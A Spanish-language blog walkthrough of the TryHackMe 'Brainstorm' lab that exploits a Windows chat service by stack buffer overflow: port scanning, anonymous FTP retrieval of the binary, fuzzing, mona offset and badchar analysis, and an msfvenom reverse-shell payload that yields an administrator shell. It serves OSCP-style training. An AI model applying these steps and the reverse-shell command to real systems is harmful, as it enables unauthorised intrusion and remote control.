---
layout: single
title: Máquina Brainstorm - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "Esta etapa del path consiste en aprender y practicar el buffer overflow de sistemas Windows. La primera room consta de un binario especialmente creado para practicar el buffer overflow de cara a la certificación OSCP por medio de 10 ejercicios. En este manual solo lo realizaremos para uno de ellos."
date: 2022-07-12
classes: wide
header:
  teaser: /assets/images/brainstorm/portada.png
  teaser_home_page: true
categories:
  - Comunidad
  - Blog
  - Writeup
tags:
  - fuzzing
  - brainstorm
  - overflow
  - immunity debugger
  - mona
  - windows
  - badchars
  - scripting
---

# Introducción
La máquina se encuentra en [TryHackMe](https://tryhackme.com/room/brainstorm). Es una máquina Windows que cuenta con un servicio vulnerable a Buffer Overflow. Para explotarlo, deberemos primero pasar el binario a una máquina donde podamos replicar los ataques a fin de obtener el script que logre vulnerarlo. Al final, solo ejecutaremos dicho script en la máquina víctima.

Para una introducción y algo de teoría sobre lo que es un buffer overflow, te recomiendo mi guía que hice hace un tiempo: [Introducción al Buffer Overflow](https://blu3ming.github.io/brainstorm-introduccion-protostar-stack0-1). Tampoco me detendré a explicar a detalle cada paso que estoy realizando; para ello, puedes revisar la guía de la room [Buffer Overflow Prep](https://blu3ming.github.io/maquina-bof-walkthrough/) donde también se vulnera un binario en Windows con ayuda de Immunity Debugger.

# Escaneo de puertos
Iniciamos con un escaneo básico con **nmap** en busca de puertos abiertos en el sistema víctima:

    nmap -sS --min-rate 5000 -p- --open -Pn -n -vv 10.10.38.197 -oG allPorts

![1]

Observamos que hay tres puertos abiertos: el 21 (FTP) y dos desconocidos de momento: 3389 y 9999.

**Nota:** TryHackMe solicita en una de sus preguntas de la room la cantidad de puertos que se encuentran abiertos en el sistema, sin embargo por alguna razón la respuesta correcta allá es 6. Solo lo menciono por si buscas completar la room en la plataforma.

Realizamos un escaneo a profundidad de dichos puertos en busca de servicios y versiones que corren en ellos.

    nmap -sC -sV -p21,3389,9999 10.10.38.197 -oN targeted

![2]

Vemos que solo  es capaz de detectar el servicio que ya conocíamos, el FTP; así que comenzamos con la enumeración de este.

# FTP
El escaneo de **nmap** nos indica que el servicio FTP permite el logueo por medio de usuario anónimo, así que lo intentamos:

![3]

Vemos que nos permite acceder y listar el contenido de este. Dentro encontraremos una carpeta llamada **chatserver**, y dentro dos archivos:

    chatserver.exe
    essfunc.dll

Los descargamos a nuestra máquina con ayuda del comando GET (esto fue un error, pero veremos por qué más adelante).

# Enumeración de los puertos restantes
Como desconocemos los servicios que corren en los dos puertos que nos quedan, intentamos conectarnos a ellos primero con ayuda de **telnet**. El primero de ellos (3389) no nos devuelve ninguna cabecera ni información al respecto, por lo que pasamos de él de momento.

El segundo (9999) sí nos devuelve una cabecera. Se trata de un servicio de chat llamado **Brainstorm**, el cual solicita un username como entrada. Este tipo de servicios abiertos y que solicitan una entrada de datos pueden ser vulnerables a Buffer Overflow.

![4]

# Análisis del BoF
Para corroborar eso último, mandamos una enorme cantidad de caracteres para ver si el servicio logra crashear. Se intentó con 1000 caracteres, pero no funcionó; luego con 2000, pero tampoco.

    Con esto generamos la cantidad de caracteres necesarios:
    python -c "print('A'*2000)"

![5]

Para no hacer esto manualmente, y ya ir iniciando con el proceso de explotación por una posible vulnerabilidad de Buffer Overflow, corremos nuestro script *fuzzer.py*:

![6]

Como podrás notar, es nuestro mismo script que empleamos en la room [Buffer Overflow Prep](https://blu3ming.github.io/maquina-bof-walkthrough) tan solo eliminando el *prefix*, dado que no necesitamos mandar un comando específico al servicio, solo los datos de entrada.

Iniciamos corriendo el script en el servicio original, viendo cómo este crashea al llegar a los 6600 caracteres. Esto ocasiona que el servicio crasheé en la máquina víctima, por lo que tendríamos que estarla reiniciando en cada ocasión.

![7]

# Creación del script para ejecutar el Buffer Overflow
Dado que no queremos estar reiniciando el servicio a cada rato, y necesitamos correrlo en un entorno controlado para poder hacer el análisis de offset, badchars y la creación del script, necesitamos el binario original.

Recordemos que este se encontraba en el servicio FTP, tanto el binario como la biblioteca dll; así que las pasamos a una máquina Windows que tengamos bajo nuestro control para poder hacer este análisis.

Como no tengo preparada una máquina Windows con Immunity Debugger, tuve que usar la máquina que se nos proporciona en la room [Buffer Overflow Prep](https://blu3ming.github.io/maquina-bof-walkthrough), solo que ahora nos conectaremos con ayuda de **Remmina** en Linux; para ello, proporcionamos las credenciales:

![8]

Pasamos los archivos del servicio con ayuda de un servidor HTTP en Python (dado que las máquinas están en la misma red).

![9]

Sin embargo, al querer ejecutarlo, nos encontraremos con que Windows no logra iniciarlo; esto se debe a que el binario se encuentra corrupto junto con su *dll*.

![10]

Es aquí donde entra el error del que hablaba en el análisis del servicio FTP, y es que obtener archivos desde este servicio puede hacer que se corrompan en el camino, para evitarlo, es recomendable iniciar el servicio FTP en modo binario para poder descargar de forma correcta cualquier archivo dentro de este servicio.

# FTP ahora en modo binario
Regresamos al FTP, solo que ahora deberemos activar el modo binario para descargar correctamente los archivos. Para ello, solo necesitamos escribir el comando **binary** después de habernos logueado. El servicio regresará la siguiente respuesta:

    Type set to I

Ya con esto, podemos iniciar con el listado del directorio y la descarga de archivos con ayuda del comando get:

    get chatserver.exe
    get essfunc.dll

![11]

# Regresamos con el análisis del binario y creación del script
Ya con los archivos correctos, vemos cómo Windows ahora sí logra ejecutarlos correctamente.

![12]

Con el servicio corriendo en nuestro Windows, iniciamos el fuzzing en busca del número de caracteres que logran crashearlo. La primera vez que lo ejecutamos en el sistema original, vimos que crasheaba a los 6600 caracteres, sin embargo, ahora lo hace a los 6300.

Para verificar cuál es el valor correcto, realizamos este fuzzing tres veces, obteniendo en todos los escenarios los 6300 caracteres.

![13]

Trabajaremos con este valor a partir de ahora. Creamos ahora nuestro patrón de caracteres con ayuda de **pattern_create.rb -l 6700** (recordemos que tenemos que crearlo con unos 400 bytes más que el valor obtenido en el fuzzing).

    /opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 6700

**Nota:** Esta ruta puede cambiar de sistema a sistema, en algunos se localiza en /usr/share/metasploit-framework...

![14]

Enviamos este patrón en el payload de nuestro **exploit.py** (revisar la guía del [Buffer Overflow Prep](https://blu3ming.github.io/maquina-bof-walkthrough) para ver el código). Cuando crasheé el servicio, buscamos el offset exacto en el que se sobreescribe el EIP.

    !mona findmsp -distance 6700

El análisis retorna que el offset exacto es de 6108, es decir, necesitamos enviar 6108 caracteres para llegar al momento exacto donde inicia el EIP.

![15]

Colocamos "BBBB" en la variable **retn** para corroborar que podamos sobreescribir el registro EIP, ya habiendo colocado el offset correcto en el script. Como se observa, esto es posible (EIP vale 42424242).

![16]

El siguiente paso es buscar los badchars del servicio. Iniciamos creando el bytearray base en mona contemplando el badchar \x00 por defecto:

    !mona bytearray -b "\x00"

Colocamos la cadena de bytes en nuestro script, contemplando igualmente el \x00 por defecto y lo ejecutamos. Hacemos el comparativo de ambos con ayuda de mona para detectar los badchars:

    !mona compare -f c:\mona\brainstorm\bytearray.bin -a <DIRECCION DEL ESP>

![17]

Como podemos observar, en la primera pasada logramos obtener el mensaje de **Unmodified**, lo que nos indica que no hay más badchars que contemplar salvo el \x00 por defecto.

Ahora, buscamos la dirección de la instrucción JMP ESP en el binario o su biblioteca que tenga el ASLR y SEH deshabilitados y que no contengan el badchar encontrado.

    !mona jmp -r esp -cpb "\x00"

![18]

Copiamos la dirección encontrada en nuestro script, añadimos los NOP's y creamos nuestro payload con ayuda de msfvenom:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.103.114 LPORT=443 EXITFUNC=thread -b "\x00" -f c

Creamos una reverse shell que se conecte a nuestra máquina sin que empleé el badchar encontrado. Lo agregamos a la variable payload del *exploit.py*.

![19]

Ya con todo listo, lo ejecutamos con una consola aparte en escucha con ayuda de netcat. Vemos cómo inmediatamente obtenemos la cmd en el sistema, habiendola comprometido exitosamente.

![20]

# Comprometiendo el sistema original
Sin embargo no hemos terminado, dado que solo comprometimos nuestro propio sistema, no la máquina original. Este paso es super sencillo, solo será necesario cambiar la dirección IP por la de la máquina **Brainstorm** y volver a ejecutar el script con netcat a la escucha:

![21]

Vemos cómo obtenemos la consola ahora de la máquina correcta. Accedemos como el usuario administrador.

![22]

Por último, solo buscamos por la única flag que tiene el sistema, la de root. Esta se encuentra en el directorio *Desktop* del usuario *Drake*.

![23]

[1]:/assets/images/brainstorm/1.png
[2]:/assets/images/brainstorm/2.png
[3]:/assets/images/brainstorm/3.png
[4]:/assets/images/brainstorm/4.png
[5]:/assets/images/brainstorm/5.png
[6]:/assets/images/brainstorm/6.png
[7]:/assets/images/brainstorm/7.png
[8]:/assets/images/brainstorm/8.png
[9]:/assets/images/brainstorm/9.png
[10]:/assets/images/brainstorm/10.png
[11]:/assets/images/brainstorm/11.png
[12]:/assets/images/brainstorm/12.png
[13]:/assets/images/brainstorm/13.png
[14]:/assets/images/brainstorm/14.png
[15]:/assets/images/brainstorm/15.png
[16]:/assets/images/brainstorm/16.png
[17]:/assets/images/brainstorm/17.png
[18]:/assets/images/brainstorm/18.png
[19]:/assets/images/brainstorm/19.png
[20]:/assets/images/brainstorm/20.png
[21]:/assets/images/brainstorm/21.png
[22]:/assets/images/brainstorm/22.png
[23]:/assets/images/brainstorm/23.png